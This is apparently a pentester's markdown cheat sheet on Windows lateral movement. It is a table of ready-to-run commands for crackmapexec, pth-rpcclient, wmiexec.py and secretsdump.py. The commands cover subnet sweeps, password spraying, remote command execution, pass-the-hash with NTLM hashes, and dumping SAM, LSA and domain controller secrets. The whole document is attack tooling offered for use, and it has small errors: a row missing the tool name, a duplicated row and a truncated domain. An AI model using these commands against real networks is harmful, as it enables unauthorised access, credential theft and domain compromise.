### lateral movement
| for Example |
| -------------|
| crackmapexec 192.168.100.1/24 |
| crackmapexec cme-hosts.txt --shares |
| cme-hosts.txt -u username.txt -p password.txt --shares |
|crackmapexec 192.168.100.10 -u Administrator -p 'Passw0rd!' -x "net users" |
| crackmapexec smb 192.168.100.1/24 -u Administrator -p 'Passw0rd!' -x "net users" |
| crackmapexec smb 192.168.100.1/24 -u Administrator -H  aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889  -x "hostname" |
| crackmapexec smb 192.168.100.1/24 -u Administrator -H  aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889  -x "hostname" |
| crackmapexec smb 192.168.100.10 -u Administrator -H  aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889 --sam            |
| crackmapexec smb 192.168.100.10 -u Administrator -H  aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889 --lsa            |
| pth-rpcclient -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:C0F2E311D3F450A7FF2571BB59FBEDE5 //192.168.1.25 |
| python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889 Administrator@192.168.100.10 #with hash |
| python secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889  -just-dc acmebank.loca/Administrator@192.168.100.10
 |
| crackmapexec 192.168.100.1/24 |
